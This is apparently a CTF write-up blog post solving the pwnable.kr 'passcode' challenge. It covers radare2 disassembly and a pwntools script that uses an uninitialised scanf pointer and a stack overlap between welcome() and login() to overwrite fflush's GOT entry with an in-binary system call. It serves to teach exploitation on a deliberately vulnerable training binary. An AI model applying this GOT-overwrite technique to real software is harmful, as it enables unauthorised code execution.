---
title: "[pwnable.kr] passcode"
published: 2026-09-25
description: Solving a wargame challenge
category: CTF
tags: [pwnable.kr, study]
draft: false
---

# Stack Frame
Honestly, it feels like a slightly different concept is at work here.  
Still, I think it comes down to understanding stack frames. That's why I emphasized `stack frame`, too.  

# Solution
## Key Points
The problem is simple.  
`stack-frame layout`, `value to write`, `target address`, and `code reuse`.  
Those four ideas seemed to matter most.  

I've barely used `Radare2`, but I'm going to make it my main debugger from now on.  
It looks like the best option. I stayed away from it before because it felt difficult.  

The protections and basic information are as follows:  
```bash
[*] '***/passcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## Code Analysis
Let's look through the code.  

### 1. `main()`
```c
int main(){
    ...
    welcome();
    login();
    ...
}
```

`main()` calls two functions. What matters is that they are called one after the other from the same caller.  
Looking at just those calls in assembly:  

```asm
...
│           0x0804938d      83c410         add esp, 0x10
│           0x08049390      e85dffffff     call sym.welcome
│           0x08049395      e85cfeffff     call sym.login
...
```

There is no meaningful change to `esp` between them, either.

### 2. `welcome()`
```c
void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}
```
It simply reads up to 100 characters. Since it uses `%s`, I can feed it `raw bytes` too. That's all I mean,,  

### 3. `login()`
```c
void login(){
    int passcode1;
    int passcode2;
    
    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);
    
    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);
    
    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
            printf("Login OK!\n");
            setregid(getegid(), getegid());
            system("/bin/cat flag");
    }
    else{
            printf("Login Failed!\n");
            exit(0);
    }
}
```
Only a few lines matter here, but I included the whole function so you can share my initial confusion.  
Simply put, both `scanf` calls are missing the `&` (ampersand), yet the function carries on as if nothing is wrong and follows them with a perfectly plausible `if` branch..  
I was confused. It was honestly a little terrifying.
# What Is This?
It was too strange to be accidental, and for the first time in a while, it got me thinking in interesting directions.  

## Plan
First, let's look at the two functions called from `main()`: `welcome` and `login`.  
There is no `esp` adjustment between the two calls, and their prologues place the stack frames at nearly the same location. Nothing special realigns the stack.  
More importantly, local variables in both functions are addressed at fixed offsets from `ebp`.  

Below is the relevant assembly. Take a moment to look it over. The key details are the `offsets`, particularly where each `scanf` expects its local variable.  
There is also an in-binary `system` call with argument-setup instructions I can reuse. And because the binary is `NO PIE`, its addresses are fixed.  
```asm
0x080490e0]> pdf @ sym.welcome
            ; CALL XREF from main @ 0x8049390
┌ 114: sym.welcome ();
│           ; var int32_t var_70h @ ebp-0x70
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x080492f2      55             push ebp
│           0x080492f3      89e5           mov ebp, esp
│           0x080492f5      53             push ebx
│           0x080492f6      83ec74         sub esp, 0x74
│           0x080492f9      e832feffff     call sym.__x86.get_pc_thunk.bx
│           0x080492fe      81c3022d0000   add ebx, 0x2d02
│           0x08049304      65a114000000   mov eax, dword gs:[0x14]
│           0x0804930a      8945f4         mov dword [var_ch], eax
│           0x0804930d      31c0           xor eax, eax
│           0x0804930f      83ec0c         sub esp, 0xc
│           0x08049312      8d8363e0ffff   lea eax, [ebx - 0x1f9d]
│           0x08049318      50             push eax                    ; const char *format
│           0x08049319      e832fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804931e      83c410         add esp, 0x10
│           0x08049321      83ec08         sub esp, 8
│           0x08049324      8d4590         lea eax, [var_70h]
│           0x08049327      50             push eax
│           0x08049328      8d8375e0ffff   lea eax, [ebx - 0x1f8b]
│           0x0804932e      50             push eax                    ; const char *format
│           0x0804932f      e89cfdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x08049334      83c410         add esp, 0x10
│           0x08049337      83ec08         sub esp, 8
│           0x0804933a      8d4590         lea eax, [var_70h]
│           0x0804933d      50             push eax
│           0x0804933e      8d837be0ffff   lea eax, [ebx - 0x1f85]
│           0x08049344      50             push eax                    ; const char *format
│           0x08049345      e806fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804934a      83c410         add esp, 0x10
│           0x0804934d      90             nop
│           0x0804934e      8b45f4         mov eax, dword [var_ch]
│           0x08049351      652b05140000.  sub eax, dword gs:[0x14]
│       ┌─< 0x08049358      7405           je 0x804935f
│       │   0x0804935a      e861000000     call sym.__stack_chk_fail_local
│       │   ; CODE XREF from sym.welcome @ 0x8049358
│       └─> 0x0804935f      8b5dfc         mov ebx, dword [var_4h]
│           0x08049362      c9             leave
└           0x08049363      c3             ret
[0x080490e0]> pdf @ sym.login
            ; CALL XREF from main @ 0x8049395
┌ 252: sym.login ();
│           ; var uint32_t var_10h @ ebp-0x10
│           ; var uint32_t var_ch @ ebp-0xc
│           ; var int32_t var_8h @ ebp-0x8
│           0x080491f6      55             push ebp
│           0x080491f7      89e5           mov ebp, esp
│           0x080491f9      56             push esi
│           0x080491fa      53             push ebx
│           0x080491fb      83ec10         sub esp, 0x10
│           0x080491fe      e82dffffff     call sym.__x86.get_pc_thunk.bx
│           0x08049203      81c3fd2d0000   add ebx, 0x2dfd
│           0x08049209      83ec0c         sub esp, 0xc
│           0x0804920c      8d8308e0ffff   lea eax, [ebx - 0x1ff8]
│           0x08049212      50             push eax                    ; const char *format
│           0x08049213      e838feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08049218      83c410         add esp, 0x10
│           0x0804921b      83ec08         sub esp, 8
│           0x0804921e      ff75f0         push dword [var_10h]
│           0x08049221      8d831be0ffff   lea eax, [ebx - 0x1fe5]
│           0x08049227      50             push eax                    ; const char *format
│           0x08049228      e8a3feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0804922d      83c410         add esp, 0x10
│           0x08049230      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x08049236      8b00           mov eax, dword [eax]
│           0x08049238      83ec0c         sub esp, 0xc
│           0x0804923b      50             push eax                    ; FILE *stream
│           0x0804923c      e81ffeffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x08049241      83c410         add esp, 0x10
│           0x08049244      83ec0c         sub esp, 0xc
│           0x08049247      8d831ee0ffff   lea eax, [ebx - 0x1fe2]
│           0x0804924d      50             push eax                    ; const char *format
│           0x0804924e      e8fdfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08049253      83c410         add esp, 0x10
│           0x08049256      83ec08         sub esp, 8
│           0x08049259      ff75f4         push dword [var_ch]
│           0x0804925c      8d831be0ffff   lea eax, [ebx - 0x1fe5]
│           0x08049262      50             push eax                    ; const char *format
│           0x08049263      e868feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x08049268      83c410         add esp, 0x10
│           0x0804926b      83ec0c         sub esp, 0xc
│           0x0804926e      8d8331e0ffff   lea eax, [ebx - 0x1fcf]
│           0x08049274      50             push eax                    ; const char *s
│           0x08049275      e816feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804927a      83c410         add esp, 0x10
│           0x0804927d      817df0e62805.  cmp dword [var_10h], 0x528e6
│       ┌─< 0x08049284      7548           jne 0x80492ce
│       │   0x08049286      817df4c907cc.  cmp dword [var_ch], 0xcc07c9
│      ┌──< 0x0804928d      753f           jne 0x80492ce
│      ││   0x0804928f      83ec0c         sub esp, 0xc
│      ││   0x08049292      8d833de0ffff   lea eax, [ebx - 0x1fc3]
│      ││   0x08049298      50             push eax                    ; const char *s
│      ││   0x08049299      e8f2fdffff     call sym.imp.puts           ; int puts(const char *s)
│      ││   0x0804929e      83c410         add esp, 0x10
│      ││   0x080492a1      e8dafdffff     call sym.imp.getegid
│      ││   0x080492a6      89c6           mov esi, eax
│      ││   0x080492a8      e8d3fdffff     call sym.imp.getegid
│      ││   0x080492ad      83ec08         sub esp, 8
│      ││   0x080492b0      56             push esi
│      ││   0x080492b1      50             push eax
│      ││   0x080492b2      e809feffff     call sym.imp.setregid
│      ││   0x080492b7      83c410         add esp, 0x10
│      ││   0x080492ba      83ec0c         sub esp, 0xc
│      ││   0x080492bd      8d8347e0ffff   lea eax, [ebx - 0x1fb9]
│      ││   0x080492c3      50             push eax                    ; const char *string
│      ││   0x080492c4      e8d7fdffff     call sym.imp.system         ; int system(const char *string)
│      ││   0x080492c9      83c410         add esp, 0x10
│     ┌───< 0x080492cc      eb1c           jmp 0x80492ea
│     │││   ; CODE XREFS from sym.login @ 0x8049284, 0x804928d
│     │└└─> 0x080492ce      83ec0c         sub esp, 0xc
│     │     0x080492d1      8d8355e0ffff   lea eax, [ebx - 0x1fab]
│     │     0x080492d7      50             push eax                    ; const char *s
│     │     0x080492d8      e8b3fdffff     call sym.imp.puts           ; int puts(const char *s)
│     │     0x080492dd      83c410         add esp, 0x10
│     │     0x080492e0      83ec0c         sub esp, 0xc
│     │     0x080492e3      6a00           push 0
│     │     0x080492e5      e8c6fdffff     call sym.imp.exit
│     │     ; CODE XREF from sym.login @ 0x80492cc
│     └───> 0x080492ea      90             nop
│           0x080492eb      8d65f8         lea esp, [var_8h]
│           0x080492ee      5b             pop ebx
│           0x080492ef      5e             pop esi
│           0x080492f0      5d             pop ebp
└           0x080492f1      c3             ret
[0x080490e0]> 
```

A `system` call sequence already present in the binary,  
an arbitrary write,  
a 100-byte input whose buffer reaches into the next function's stack frame,  
`No PIE`,  
and an `fflush()` call sitting suspiciously between the two inputs.  

Putting these five facts together, the path was fairly clear:  
overwrite `fflush()`'s GOT entry with the address of the `system` call sequence, so the next `fflush()` executes just the part that reads the `flag` file..  
That was the idea.  

To make this work, `passcode1` needs to contain **a target address**—here, the GOT entry for `fflush()`—and `welcome()`'s `name` buffer must be close enough to overwrite it within the 100-byte input.  

Starting from `name`, overwrite `passcode1` with that GOT address. Then, when `login()` reads `passcode1`,  
it writes the address of the `system` call sequence to that target, causing the code that reads the `flag` file to run. I think that sums it up.  

## Exploit
```py
cat ex.py 
from pwn import *

context.binary = elf = ELF('./passcode')
context.log_level = "debug"

#p = process()
p = remote("pwnable.kr", 10004)

def slog(n, a): return success(': '.join([n, hex(a)]))

fflush_got = elf.got["fflush"]
slog("fflush_GOT", fflush_got)
system = 0x080492bd
slog("in-binary system gadget", system)

pay = b'A'*(0x70-0x10) + p32(fflush_got)
p.sendline(pay)
pause()
p.sendline(str(system).encode())

p.interactive()
```
Come to think of it, I think I've been using `slog()` ever since I saw it in some Dreamhack lecture.  
It just clicked, and I made a point of remembering it because I did not want to forget the helper.  

# Aside
```bash
[0x080490e0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x0804a008 18  19   .rodata ascii enter passcode1 : 
1   0x0000201e 0x0804a01e 18  19   .rodata ascii enter passcode2 : 
2   0x00002031 0x0804a031 11  12   .rodata ascii checking...
3   0x0000203d 0x0804a03d 9   10   .rodata ascii Login OK!
4   0x00002047 0x0804a047 13  14   .rodata ascii /bin/cat flag
5   0x00002055 0x0804a055 13  14   .rodata ascii Login Failed!
6   0x00002063 0x0804a063 17  18   .rodata ascii enter you name : 
7   0x00002075 0x0804a075 5   6    .rodata ascii %100s
8   0x0000207b 0x0804a07b 12  13   .rodata ascii Welcome %s!\n
9   0x00002088 0x0804a088 39  40   .rodata ascii Toddler's Secure Login System 1.1 beta.
10  0x000020b0 0x0804a0b0 54  55   .rodata ascii Now I can safely trust you that you have credential :)

[0x080490e0]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x08049040 GLOBAL FUNC       __libc_start_main
2   0x08049050 GLOBAL FUNC       printf
3   0x08049060 GLOBAL FUNC       fflush
4   0x08049070 GLOBAL FUNC       __stack_chk_fail
5   0x08049080 GLOBAL FUNC       getegid
6   0x08049090 GLOBAL FUNC       puts
7   0x080490a0 GLOBAL FUNC       system
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x080490b0 GLOBAL FUNC       exit
10  0x00000000 GLOBAL OBJ        stdin
11  0x080490c0 GLOBAL FUNC       setregid
12  0x080490d0 GLOBAL FUNC       __isoc99_scanf
```

And `r2` makes it this easy to inspect the `GOT table` and `strings` list!! That's ridiculously cool.  
Whoa.

) Edit  
Oh, right.  
Unlike `%s`, which treats its input as `raw bytes`, `%d` parses a base-10 integer,  
so I need to send `str(value).encode()`. Then it recognizes the value as a number and works. This almost made my brain freeze for a second.
